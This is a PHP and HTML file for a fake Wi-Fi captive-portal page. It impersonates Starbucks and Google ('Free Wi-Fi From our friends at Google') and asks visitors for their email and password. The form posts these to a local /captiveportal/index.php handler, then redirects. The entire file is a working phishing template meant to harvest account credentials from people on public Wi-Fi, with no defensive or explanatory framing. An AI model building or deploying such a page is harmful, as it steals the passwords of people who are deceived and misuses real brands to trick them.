<?php
$destination = "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['HTTP_URI'] . "";
require_once('helper.php');
?>

  <HTML>

  <HEAD>
    <title>Sign in - Starbucks</title>
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
    <meta http-equiv="Pragma" content="no-cache" />
    <meta http-equiv="Expires" content="0" />
    <script type="text/javascript">
      function redirect() {
        setTimeout(function() {
          window.location = "/captiveportal/index.php";
        }, 100);
      }
    </script>
    <meta charset='UTF-8'>
    <meta name="viewport" content="width=device-width, initial-scale=0.75">
    <link rel="stylesheet" href="assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="assets/css/style.css">
    <script src="assets/js/jquery-2.2.1.min.js"></script>
    <link rel="icon" type="image/png" href="assets/img/oc3czvmbvf.png"/>
    <style>
    body {
      background-image: url("assets/img/bg.png");
      background-position: center;
      background-attachment: fixed;
      background-repeat: no-repeat;
      -webkit-background-size: 100%; 
      -moz-background-size: 100%; 
      -o-background-size: 100%; 
      background-size: 100%; 
      -webkit-background-size: cover; 
      -moz-background-size: cover; 
      -o-background-size: cover; 
      background-size: cover;
    }

    .google-header-bar {
    height: 71px;
    border-bottom: 1px solid #e5e5e5;
    overflow: hidden;
    }

    .google-header-bar.centered {
    border: 0;
    height: 108px;
    }

    .google-header-bar.centered .header .logo {
    float: none;
    margin: 40px auto 30px;
    display: block;
    }
    .google-header-bar.centered .header .secondary-link {
    display: none
    }

    .header .logo {
    margin: 17px 0 0;
    float: left;
    height: 38px;
    width: 116px;
    }
    </style>

    <style media="screen and (max-width: 800px), screen and (max-height: 800px)">
      .google-header-bar.centered {
        height: 83px;
      }

      .google-header-bar.centered .header .logo {
        margin: 25px auto 20px;
      }

      .card {
        margin-bottom: 20px;
      }
    </style>

    <style media="screen and (max-width: 580px)">
      html,
      body {
        font-size: 14px;
      }

      .google-header-bar.centered {
        height: 73px;
      }

      .google-header-bar.centered .header .logo {
        margin: 20px auto 15px;
      }

      .content {
        padding-left: 10px;
        padding-right: 10px;
      }

      .hidden-small {
        display: none;
      }

      .card {
        padding: 20px 15px 30px;
        width: 270px;
      }

      .footer ul li {
        padding-right: 1em;
      }

      .lang-chooser-wrap {
        display: none;
      }
    </style>

  </HEAD>

  <BODY>
    <div class="container">
      <div class="account-wall">
        <img class="profile-img" src="assets/img/logo.png" alt="">
        <h1 class="text-center login-title">Free Wi-Fi</h1>
        <h2 class="text-center friends-text">From our friends at Google</h2>
        <form method="POST" action="/captiveportal/index.php" onsubmit="redirect()" class="form-signin">
          <input type="hidden" name="target" value="<?=$destination?>">
          <input type="text" name="email" class="form-control" placeholder="Email" required>
          <input type="password" name="password" class="form-control" placeholder="Password" required>
          <br>

          <button class="btn btn-primary btn-block btn-xlarge btn-sharp" name="login" type="submit">
          Accept &amp; Connect</button>

          <div class="text-center terms-text1">I agree to the <a href="#" class="url-color">Terms of Service</a> and have 

          <div class="text-center terms-text2"> reviewed the <a href="#" class="url-color">Google Privacy Policy</a></h3>

          <div class="text-center terms-text3">Need help? <a href="#" class="url-color">855-446-2374</a></h3>


        </form>
      </div>
    </div>
  </BODY>

  </HTML>
